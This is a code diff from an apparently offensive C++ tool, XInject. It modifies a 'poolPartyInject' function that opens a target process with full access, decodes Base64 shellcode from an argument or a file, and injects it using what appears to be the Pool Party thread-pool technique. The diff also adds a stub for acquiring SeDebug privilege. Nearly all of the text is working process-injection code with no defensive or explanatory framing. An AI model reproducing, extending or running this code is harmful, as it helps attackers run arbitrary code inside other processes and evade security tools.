@@ -808,7 +808,7 @@ namespace XInject
             return true;
         }
 
-        bool poolPartyInject(DWORD pid, int mode, int method, std::string args) {
+        bool poolPartyInject(DWORD pid, int mode, int method, std::string args, bool sedebug) {
             //       DLL file  url shellcode shellcode_file 
             //mode = 0         1   2         3 
             //       shellcode shellcode_file 
@@ -818,16 +818,21 @@ namespace XInject
             SIZE_T dwWriteSize = 0;
             LPVOID pAddress = nullptr;
             LPVOID pBootAddress = nullptr;
-            // HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
             std::string fileContent = "";
 
-            // if (hProcess == INVALID_HANDLE_VALUE)
-            // {
-            //     Error::error(L"Invalid Process Handle");
-            //     return false;
-            // }
+            if (hProcess == INVALID_HANDLE_VALUE)
+            {
+                Error::error(L"Invalid Process Handle");
+                return false;
+            }
 
             // FIXME: need SeDebug Privillege
+            // if (sedebug) {
+            //     if (!w_RtlAdjustPrivilege(SeDebugPrivilege, TRUE, FALSE)) {
+            //         Error::error(L"get Sedebug priv failed");
+            //     }
+            // }
             // if (mode == 0 && !isFileExists(args))
             // {
             //     Error::error(L"No such file");
@@ -873,24 +878,51 @@ namespace XInject
             //         CloseHandle(hProcess);
             //         return false;
             //     }
-            //     const auto Injector = PoolPartyFactory(method, pid, bootshellcode, shellcodeSize);
-            //     Injector->Inject();
-            //     return true;
+            //     try
+            //     {
+            //         const auto Injector = PoolPartyFactory(method, pid, bootshellcode, shellcodeSize);
+            //         Injector->Inject();
+            //         return true;
+            //     }
+            //     catch (const std::exception& e)
+            //     {
+            //         std::cerr << e.what() << '\n';
+            //         return false;
+            //     }
+
             // }
 
             if (mode == 0) {   //shellcode
-                std::string decShellcode = Crypto::Base64Decode(args);
-                const auto Injector = PoolPartyFactory(method, pid, (unsigned char*)(decShellcode.c_str()), decShellcode.length());
-                Injector->Inject();
-                return true;
+                try
+                {
+                    std::string decShellcode = Crypto::Base64Decode(args);
+                    const auto Injector = PoolPartyFactory(method, pid, (unsigned char*)(decShellcode.c_str()), decShellcode.length());
+                    Injector->Inject();
+                    return true;
+                }
+                catch (const std::exception& e)
+                {
+                    std::cerr << e.what() << '\n';
+                    return false;
+                }
+
 
             }
             else if (mode == 1) {   //shellcode_file
-                std::string base64Shellcode = XInject::ReadFileToString(args);
-                std::string decShellcode = Crypto::Base64Decode(base64Shellcode);
-                const auto Injector = PoolPartyFactory(method, pid, (unsigned char*)(decShellcode.c_str()), decShellcode.length());
-                Injector->Inject();
-                return true;
+                try
+                {
+                    std::string base64Shellcode = XInject::ReadFileToString(args);
+                    std::string decShellcode = Crypto::Base64Decode(base64Shellcode);
+                    const auto Injector = PoolPartyFactory(method, pid, (unsigned char*)(decShellcode.c_str()), decShellcode.length());
+                    Injector->Inject();
+                    return true;
+                }
+                catch (const std::exception& e)
+                {
+                    std::cerr << e.what() << '\n';
+                    return false;
+                }
+
             }
             return false;
         }
